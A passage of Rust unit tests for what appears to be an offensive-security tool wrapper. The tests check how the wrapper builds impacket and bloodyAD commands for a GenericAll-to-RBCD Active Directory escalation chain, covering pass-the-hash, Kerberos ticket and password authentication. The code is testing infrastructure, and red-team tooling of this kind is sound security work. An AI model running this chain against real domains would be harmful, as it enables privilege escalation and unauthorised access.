    /// `domain/username[:password]` with no `@host` suffix.
    fn impacket_chain_cases() -> Vec<(&'static str, Value, Builder)> {
        vec![
            (
                "add_computer",
                with_arg(&add_computer_base(), "dc_host", "dc01.contoso.local"),
                super::build_add_computer as Builder,
            ),
            (
                "rbcd_write",
                rbcd_write_base(),
                super::build_rbcd_write as Builder,
            ),
        ]
    }

    /// Every step of the GenericAll→RBCD chain, impacket- and bloodyAD-backed.
    fn chain_cases() -> Vec<(&'static str, Value, Builder)> {
        let mut cases = impacket_chain_cases();
        cases.push(("addspn", addspn_base(), super::build_addspn as Builder));
        cases
    }

    #[test]
    fn chain_accepts_hash_only_auth() {
        for (name, base, build) in chain_cases() {
            let cmd = build(&with_arg(&base, "hash", NT))
                .unwrap_or_else(|e| panic!("{name} must build from a hash alone: {e}"));
            let argv = cmd.args_for_test();
            assert!(
                argv.iter().any(|a| a.contains(&format!("{EMPTY_LM}:{NT}"))),
                "{name} must carry the normalized LM:NT pair: {argv:?}"
            );
        }
    }

    #[test]
    fn chain_accepts_ticket_only_auth() {
        for (name, base, build) in chain_cases() {
            let cmd = build(&with_arg(&base, "ticket_path", CCACHE))
                .unwrap_or_else(|e| panic!("{name} must build from a ccache alone: {e}"));
            assert!(
                cmd.args_for_test().iter().any(|a| a == "-k"),
                "{name} must select the Kerberos branch"
            );
            assert!(
                cmd.env_vars_for_test()
                    .iter()
                    .any(|(k, v)| k == "KRB5CCNAME" && v == CCACHE),
                "{name} must export KRB5CCNAME"
            );
        }
    }

    #[test]
    fn chain_accepts_password_only_auth() {
        for (name, base, build) in chain_cases() {
            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!"))
                .unwrap_or_else(|e| panic!("{name} must build from a password alone: {e}"));
            let argv = cmd.args_for_test();
            assert!(argv.iter().all(|a| a != "-k"), "{name}");
            assert!(argv.iter().all(|a| a != "-hashes"), "{name}");
        }
    }

    #[test]
    fn chain_without_auth_material_errors_naming_every_form() {
        for (name, base, build) in chain_cases() {
            let Err(err) = build(&base) else {
                panic!("{name} must refuse to dispatch without any auth material");
            };
            let err = err.to_string();
            for form in ["ticket_path", "hash", "nt_hash", "ntlm_hash", "password"] {
                assert!(
                    err.contains(form),
                    "{name} error must name the `{form}` auth form; got: {err}"
                );
            }
        }
    }

    #[test]
    fn impacket_chain_identity_carries_no_password_under_hash_or_ticket() {
        for (name, base, build) in impacket_chain_cases() {
            for key in ["hash", "ticket_path"] {
                let value = if key == "hash" { NT } else { CCACHE };
                let args = with_arg(&with_arg(&base, key, value), "password", "P@ssw0rd!");
                let cmd = build(&args).unwrap();
                let argv = cmd.args_for_test();
                assert!(
                    argv.iter().any(|a| a == "contoso.local/alice"),
                    "{name} ({key}) must send the bare domain/user identity: {argv:?}"
                );
                assert!(
                    argv.iter().all(|a| !a.contains("P@ssw0rd!")),
                    "{name} ({key}) leaked the password into the argv: {argv:?}"
                );
                assert!(argv.iter().any(|a| a == "-no-pass"), "{name} ({key})");
            }
        }
    }

    #[test]
    fn impacket_chain_password_identity_has_the_password_suffix() {
        for (name, base, build) in impacket_chain_cases() {
            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!")).unwrap();
            assert!(
                cmd.args_for_test()
                    .iter()
                    .any(|a| a == "contoso.local/alice:P@ssw0rd!"),
                "{name} must fold the password into the identity string"
            );
        }
    }

    #[test]
    fn impacket_chain_hash_normalization() {
        let expected_empty_lm = format!("{EMPTY_LM}:{NT}");
        let cases: Vec<(&str, String, String)> = vec![
            ("hash", NT.to_string(), expected_empty_lm.clone()),
            ("hash", format!("{LM}:{NT}"), format!("{LM}:{NT}")),
            ("hash", format!(":{NT}"), expected_empty_lm.clone()),
            ("hash", format!("  {NT}  "), expected_empty_lm.clone()),
            ("nt_hash", NT.to_string(), expected_empty_lm.clone()),
            ("ntlm_hash", NT.to_string(), expected_empty_lm),
        ];
        for (name, base, build) in impacket_chain_cases() {
            for (key, raw, expected) in &cases {
                let cmd = build(&with_arg(&base, key, raw)).unwrap();
                assert_eq!(
                    flag_value(cmd.args_for_test(), "-hashes"),
                    Some(expected.as_str()),
                    "{name}: {key}={raw} must reach impacket as -hashes LMHASH:NTHASH"
                );
            }
        }
    }

    #[test]
    fn chain_rejects_malformed_hash() {
        for (name, base, build) in chain_cases() {
            for raw in [
                "not-a-hash",
                "0123456789abcdef",
                "0123456789abcdef0123456789abcde",
                "0123456789abcdef0123456789abcdefa",
                "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
                "nolm:0123456789abcdef0123456789abcde",
                "0123456789abcdef0123456789abcdef:short",
            ] {
                let Err(err) = build(&with_arg(&base, "hash", raw)) else {
                    panic!("{name}: malformed hash {raw:?} must not reach the subprocess");
                };
                assert!(
                    err.to_string().contains("malformed NTLM hash"),
                    "{name}: expected a malformed-hash error for {raw:?}, got: {err}"
                );
            }
        }
    }

    #[test]
    fn chain_auth_precedence_is_ticket_then_hash_then_password() {
        for (name, base, build) in chain_cases() {
            let all_three = with_arg(
                &with_arg(&with_arg(&base, "password", "P@ssw0rd!"), "hash", NT),
                "ticket_path",
                CCACHE,
            );
            let cmd = build(&all_three).unwrap();
            assert!(
                cmd.args_for_test().iter().all(|a| a != "-hashes"),
                "{name}: ticket_path must suppress the hash branch"
            );
            assert!(
                cmd.env_vars_for_test()
                    .iter()
                    .any(|(k, _)| k == "KRB5CCNAME"),
                "{name}: ticket_path must win"
            );

            let hash_and_password = with_arg(&with_arg(&base, "hash", NT), "password", "P@ssw0rd!");
            let cmd = build(&hash_and_password).unwrap();
            assert!(
                cmd.args_for_test().iter().all(|a| !a.contains("P@ssw0rd!")),
                "{name}: hash must win over password"
            );
        }
    }

    #[test]
    fn chain_empty_hash_falls_back_to_password() {
        for (name, base, build) in chain_cases() {
            let args = with_arg(&with_arg(&base, "hash", ""), "password", "P@ssw0rd!");
            let cmd = build(&args)
                .unwrap_or_else(|e| panic!("{name} must fall through an empty hash: {e}"));
            assert!(
                cmd.args_for_test().iter().all(|a| a != "-hashes"),
                "{name}: an empty hash must not select the pass-the-hash branch"
            );
        }
    }

    #[test]
    fn add_computer_kerberos_requires_dc_host() {
        let args = with_arg(&add_computer_base(), "ticket_path", CCACHE);
        let Err(err) = super::build_add_computer(&args) else {
            panic!("addcomputer.py rejects -k without -dc-host; the wrapper must too");
        };
        assert!(err.to_string().contains("dc_host"), "{err}");

        let args = with_arg(&args, "dc_host", "dc01.contoso.local");
        let cmd = super::build_add_computer(&args).unwrap();
        assert_eq!(
            flag_value(cmd.args_for_test(), "-dc-host"),
            Some("dc01.contoso.local")
        );
    }

    #[test]
    fn add_computer_delete_action_keeps_hash_auth() {
        let args = with_arg(
            &with_arg(&add_computer_base(), "hash", NT),
            "action",
            "delete",
        );
        let cmd = super::build_add_computer(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "-delete"));
        assert!(argv.iter().all(|a| a != "-computer-pass"));
        assert_eq!(
            flag_value(argv, "-hashes"),
            Some(format!("{EMPTY_LM}:{NT}").as_str())
        );
    }

    #[test]
    fn add_computer_delete_action_needs_no_computer_password() {
        let mut args = add_computer_base();
        args.as_object_mut().unwrap().remove("computer_password");
        let args = with_arg(
            &with_arg(&args, "password", "P@ssw0rd!"),
            "action",
            "delete",
        );
        assert!(super::build_add_computer(&args).is_ok());
    }

    #[test]
    fn addspn_hash_auth_uses_bloodyad_password_flag() {
        let cmd = super::build_addspn(&with_arg(&addspn_base(), "hash", NT)).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(
            flag_value(argv, "-p"),
            Some(format!("{EMPTY_LM}:{NT}").as_str())
        );
        assert_eq!(flag_value(argv, "-u"), Some("alice"));
        assert_eq!(flag_value(argv, "-d"), Some("contoso.local"));
    }

    #[test]
    fn addspn_ticket_auth_uses_ccache_keyword_form() {
        let cmd = super::build_addspn(&with_arg(&addspn_base(), "ticket_path", CCACHE)).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| *a == format!("ccache={CCACHE}")));
        assert!(
            argv.iter().all(|a| a != "-p"),
            "ticket_path must suppress both -p forms: {argv:?}"
        );
    }

    #[test]
    fn rbcd_write_passes_dc_host_when_supplied() {
        let args = with_arg(
            &with_arg(&rbcd_write_base(), "hash", NT),
            "dc_host",
            "dc01.contoso.local",
        );
        let cmd = super::build_rbcd_write(&args).unwrap();
        assert_eq!(
            flag_value(cmd.args_for_test(), "-dc-host"),
            Some("dc01.contoso.local")
        );
    }

    #[tokio::test]
    async fn add_computer_with_hash_executes() {
        mock::push(mock::success());
        let args = with_arg(&add_computer_base(), "hash", NT);
        assert!(add_computer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn rbcd_write_with_hash_executes() {
        mock::push(mock::success());
        let args = with_arg(&rbcd_write_base(), "hash", NT);
        assert!(rbcd_write(&args).await.is_ok());
    }

    #[tokio::test]
    async fn addspn_with_hash_executes() {
        mock::push(mock::success());
        let args = with_arg(&addspn_base(), "hash", NT);
        assert!(addspn(&args).await.is_ok());
    }
}
